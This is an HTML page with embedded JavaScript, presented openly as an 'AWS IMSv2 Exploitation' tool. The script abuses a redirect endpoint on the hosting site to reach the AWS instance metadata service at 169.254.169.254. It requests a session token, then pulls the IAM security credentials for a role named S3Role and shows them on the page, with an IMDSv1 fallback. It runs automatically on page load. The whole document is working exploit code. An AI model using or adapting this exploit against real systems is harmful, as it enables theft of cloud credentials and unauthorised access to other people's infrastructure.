<html>
    <head>
        <title>AWS IMSv2 - Origin Fixed</title>
    </head>
    <body>
        <h1>AWS IMSv2 Exploitation</h1>
        <div id="status">Initializing...</div>
        <div id="results"></div>
        
        <script>
            var status = document.getElementById("status");
            var results = document.getElementById("results");
            
            status.innerHTML = "Starting AWS IMSv2 exploitation...";
            
            // Function to make requests using the current page's origin
            function makeAWSRequest() {
                var baseUrl = window.location.protocol + "//" + window.location.host;
                
                status.innerHTML += "<br>Base URL: " + baseUrl;
                status.innerHTML += "<br>Attempting token request...";
                
                try {
                    // Step 1: Get token with PUT request
                    var tokenXhr = new XMLHttpRequest();
                    var tokenUrl = baseUrl + "/redir.php?url=http://169.254.169.254/latest/api/token";
                    
                    tokenXhr.open('PUT', tokenUrl, false);
                    tokenXhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
                    tokenXhr.send();
                    
                    if (tokenXhr.status === 200 || tokenXhr.status === 0) {
                        var token = tokenXhr.responseText;
                        results.innerHTML += "<h3>Token Success:</h3><pre>" + token + "</pre>";
                        
                        // Step 2: Get credentials with token
                        var credXhr = new XMLHttpRequest();
                        var credUrl = baseUrl + "/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role";
                        
                        credXhr.open('GET', credUrl, false);
                        credXhr.setRequestHeader('X-aws-ec2-metadata-token', token);
                        credXhr.send();
                        
                        if (credXhr.status === 200 || credXhr.status === 0) {
                            results.innerHTML += "<h3>AWS Credentials:</h3><pre style='word-wrap: break-word; white-space: pre-wrap;'>" + credXhr.responseText + "</pre>";
                            status.innerHTML += "<br>SUCCESS! AWS credentials retrieved!";
                        } else {
                            results.innerHTML += "<h3>Credentials Error:</h3><pre>Status: " + credXhr.status + "<br>" + credXhr.responseText + "</pre>";
                        }
                        
                    } else {
                        results.innerHTML += "<h3>Token Error:</h3><pre>Status: " + tokenXhr.status + "<br>" + tokenXhr.responseText + "</pre>";
                        
                        // Fallback: Try without token (IMSv1)
                        status.innerHTML += "<br>Trying fallback methods...";
                        tryFallbackMethods(baseUrl);
                    }
                    
                } catch(e) {
                    results.innerHTML += "<h3>JavaScript Error:</h3><pre>" + e.message + "</pre>";
                    status.innerHTML += "<br>Error occurred, trying alternative methods...";
                    tryFallbackMethods(baseUrl);
                }
            }
            
            function tryFallbackMethods(baseUrl) {
                // Try IMSv1 (no token required)
                try {
                    var fallbackXhr = new XMLHttpRequest();
                    fallbackXhr.open('GET', baseUrl + "/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/", false);
                    fallbackXhr.send();
                    results.innerHTML += "<h3>IMSv1 Fallback:</h3><pre>" + fallbackXhr.responseText + "</pre>";
                } catch(e) {
                    results.innerHTML += "<h3>Fallback Error:</h3><pre>" + e.message + "</pre>";
                }
            }
            
            // Check current environment and start
            status.innerHTML += "<br>Current URL: " + window.location.href;
            status.innerHTML += "<br>Starting in 2 seconds...";
            
            setTimeout(makeAWSRequest, 2000);
        </script>
    </body>
</html>
